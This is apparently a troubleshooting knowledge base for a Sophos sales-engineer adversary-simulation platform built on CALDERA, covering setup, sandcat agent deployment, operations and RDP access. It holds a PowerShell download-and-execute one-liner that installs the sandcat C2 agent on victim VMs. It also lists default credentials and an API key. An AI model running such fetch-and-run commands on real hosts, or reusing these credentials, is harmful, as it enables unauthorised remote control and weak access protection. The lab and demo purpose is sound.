# Sophos SE Demo Platform — Knowledge Base

## Getting Started

### How do I install the platform for the first time?
Run `make install` from the adversary-sim directory. This handles everything: Docker setup, AI provider selection, CALDERA crypto keys, sandcat compilation, and scenario loading. Takes about 3 minutes on a fast connection.

### How do I start the platform after it's already installed?
Run `make up`. This detects whether you're in standalone or LabOps mode automatically.

### How do I check if everything is running?
Run `make status` to see all containers. All containers should show "Up". Key ones: advsim-caldera, advsim-nginx, advsim-n8n.

### What ports does the platform use?
- SE Console: http://localhost:8081
- CALDERA: http://localhost:8888
- n8n: http://localhost:5679
- Guacamole (standalone): http://localhost:8085/guacamole

---

## Sandcat Agent

### The agent isn't checking in to CALDERA. What's wrong?
Most common causes:
1. **Sandcat binary not compiled** — run `make sandcat` to cross-compile the AMD64 Windows binary. This must be run after every fresh `docker compose up` or `make clean`.
2. **Wrong CALDERA server IP in s.ps1** — the s.ps1 file has the CALDERA server IP hardcoded. Make sure it matches your Docker host IP before deploying to victim VMs.
3. **Firewall blocking port 8888** — the victim VM needs to reach your Docker host on port 8888. Check Windows Defender Firewall and any network firewalls between the victim and your Mac.
4. **Agent in wrong group** — agents must check in to group `red`. Verify in CALDERA: Campaigns → Agents.

### How do I deploy the sandcat agent to a Windows VM?
On the victim VM, open PowerShell as Administrator and run:
```
powershell -c "iex(iwr 'http://<YOUR_HOST_IP>:8081/s.ps1' -UseBasicParsing)"
```
Replace `<YOUR_HOST_IP>` with your Mac's IP on the same network as the VM.

### Sandcat was working before but stopped after a restart. Why?
The compiled sandcat binary lives in the caldera-data Docker volume. If you ran `make clean` (which deletes volumes), you need to run `make sandcat` again. Also check that the agent process is still running on the victim VM — it doesn't auto-restart by default.

### How do I check if the sandcat binary is compiled?
Run: `docker exec advsim-caldera ls /usr/src/app/plugins/sandcat/payloads/`
You should see `sandcat.go-windows`. If it's missing, run `make sandcat`.

---

## CALDERA & Operations

### I launched an operation but nothing is happening. Why?
Most common causes:
1. **No active agent** — go to CALDERA (localhost:8888), Campaigns → Agents. You need at least one trusted agent in group `red`.
2. **Stale agents causing discards** — if multiple agents are trusted and some are dead, CALDERA tries to assign abilities to dead agents and marks them discarded. Untrust all agents except the current live one: Campaigns → Agents → set Trusted=False for stale agents.
3. **Wrong adversary ID** — verify the scenario's `caldera_ability` field in scenarios.json matches an adversary ID in CALDERA.

### Operations show abilities as "discarded" immediately. What's happening?
You have stale trusted agents. Go to CALDERA → Campaigns → Agents and set Trusted=False for every agent except the currently active one. Then re-launch the operation.

### How do I access CALDERA directly?
Go to http://localhost:8888. Credentials: red/admin or admin/admin. API key: `MDRLABRED`.

### I need to reload the attack scenarios into CALDERA after a clean install.
Run `make profiles`. This pushes all abilities and adversary profiles from `caldera-profiles/` into CALDERA via the REST API.

---

## Attack Console & RDP

### The RDP panel isn't connecting. It just shows a blank screen or error.
Check these in order:
1. **Victim VM is running and reachable** — can you ping the victim IP from your Mac?
2. **RDP is enabled on the victim** — Windows: Settings → System → Remote Desktop → Enable.
3. **Guacamole credentials** — these come from `/api/config` (n8n). Check that `VICTIM_USER` and `VICTIM_PASSWORD` in your `.env` file match the actual Windows credentials.
4. **n8n is running** — run `make status` and confirm advsim-n8n is Up. The console calls n8n to get Guacamole credentials.
5. **In LabOps mode** — if you're using LabOps, Guacamole is provided by LabOps. Make sure LabOps is running on the same Docker network.

### The console page opens but the CALDERA feed isn't updating.
The console polls CALDERA every 3 seconds. Check:
1. The operation is actually in "running" state in CALDERA (not paused or finished)
2. advsim-caldera container is running: `make status`
3. The operation_id in the URL matches an actual operation in CALDERA

### I can see CALDERA abilities running but RDP shows a blank screen.
This is usually a timing issue — Guacamole takes a few seconds to establish the RDP connection. Wait 10–15 seconds. If it persists, check the Guacamole container logs: `docker logs advsim-guacamole`.

---

## AI Provider & Scenario Studio

### Scenario Studio AI Generate isn't working. Getting an error.
Check these in order:
1. **AI provider configured?** — go to Settings and verify your AI provider and API key are set.
2. **API key valid?** — use the "Test Connection" button in Settings to verify.
3. **n8n running?** — the AI generation goes through n8n. Run `make status`.
4. **Using Ollama?** — make sure `ollama serve` is running and the model is pulled: `ollama pull llama3.2:3b`

### How do I switch AI providers (e.g., from Ollama to Claude)?
Go to Settings (gear icon in the platform). Select your provider, enter the API key, and save. The change takes effect immediately.

### n8n workflows aren't receiving webhooks. What's wrong?
1. Confirm n8n is running: `make status` → advsim-n8n should be Up
2. Check n8n logs: `docker logs advsim-n8n`
3. The most common issue: workflows aren't activated. Go to http://localhost:5679 and make sure all workflows show "Active" toggle on.
4. If workflows show errors on the "Write to scenarios.json" step, check that the n8n container has `NODE_FUNCTION_ALLOW_BUILTIN=fs,path,child_process` set in docker-compose.yml (it should be there by default).

---

## Lab & VM Management

### How do I provision a new Windows VM?
Use LabOps (separate platform). Open the LabOps console in your browser and use the Provision form. Three templates are available: Windows 11, Win11 Unmanaged, and Windows Server.

### My VM templates are missing or the LabOps console shows no templates.
LabOps pulls templates from Proxmox. Check that Proxmox is running and that your LabOps configuration has the correct Proxmox API credentials.

### VMs aren't starting / stopping from LabOps.
Check the LabOps container logs and verify the Proxmox API is reachable. Also confirm the `.env` file in LabOps has the correct `PROXMOX_HOST`, `PROXMOX_USER`, and `PROXMOX_PASSWORD` values.

---

## Docker & Infrastructure

### How do I completely reset everything and start fresh?
Run `make clean` — this removes all containers AND Docker volumes (including CALDERA data and Guacamole DB). You'll need to run `make install` again from scratch. **Warning: this is destructive and cannot be undone.**

### Some containers won't start. How do I debug?
1. Run `make status` to see which container is failing
2. Check logs: `docker logs advsim-<name>` (e.g., `docker logs advsim-caldera`)
3. Common fix: `make down` followed by `make up`

### The platform was working yesterday but nothing loads today.
1. Check Docker Desktop is running
2. Run `make status` — are all containers Up?
3. If containers are stopped: `make up`
4. If containers show "Exited": check logs with `docker logs advsim-nginx`

### How do I update the platform?
```
git pull
make down
make up
```
If there are schema changes or new scenarios: `make profiles` after `make up`.

---

## Scenarios & Demo Content

### A scenario isn't showing in the SE Console.
Check `nginx/html/scenarios.json` — the scenario must have a valid entry with `product`, `id`, `title`, and `caldera_ability` fields. If you recently added it via Scenario Studio, try refreshing the page.

### A scenario launches but the CALDERA operation does nothing.
The `caldera_ability` field in scenarios.json contains the **adversary ID** (not an ability ID). Verify the adversary exists in CALDERA: http://localhost:8888 → Stockpile → Adversaries. If it's missing, run `make profiles`.

### How many scenarios are there?
24 production scenarios: 11 Endpoint, 6 NDR, 7 Firewall. Plus any AI-generated scenarios you've created in Scenario Studio.

### What MITRE techniques are covered?
60+ techniques across the 24 production scenarios. Each scenario's MITRE mapping is shown in the SE Console detail panel when you select it.

---

## Credentials & Access

### What are the default credentials?
- CALDERA web UI: red/admin or admin/admin
- CALDERA API key: `MDRLABRED`
- n8n: credentials set in your .env file (default password: SEdemo2026)
- Guacamole: guacadmin / set in .env
- Victim VM RDP: set in .env (VICTIM_USER / VICTIM_PASSWORD)
- Kali SSH: root@localhost port 2222, password: kali

### I forgot my n8n password.
It's in your `.env` file as `N8N_PASSWORD`. If you've lost the .env file, you'll need to run `make clean` and `make install` to reset everything.

---

## Common Error Messages

### "No active agent found in group red"
No sandcat agent is currently trusted in CALDERA. Either deploy a new sandcat agent to a victim VM, or go to CALDERA → Campaigns → Agents and trust an existing agent.

### "CALDERA agents API returned 401"
The CALDERA API key is wrong or CALDERA isn't running. The key should be `MDRLABRED`. Check `make status` to confirm advsim-caldera is Up.

### "Could not reach webhook. Is n8n running?"
n8n is not running or not reachable. Run `make status`. If advsim-n8n is stopped, run `make up`.

### "No CALDERA adversary configured for this scenario"
The selected scenario has no `caldera_ability` value or the adversary doesn't exist in CALDERA. Run `make profiles` to reload all adversary profiles.

### Operation shows all abilities as "Discarded" with no output
Classic stale agent problem. Go to CALDERA → Campaigns → Agents → untrust all agents except the current one → re-launch the operation.
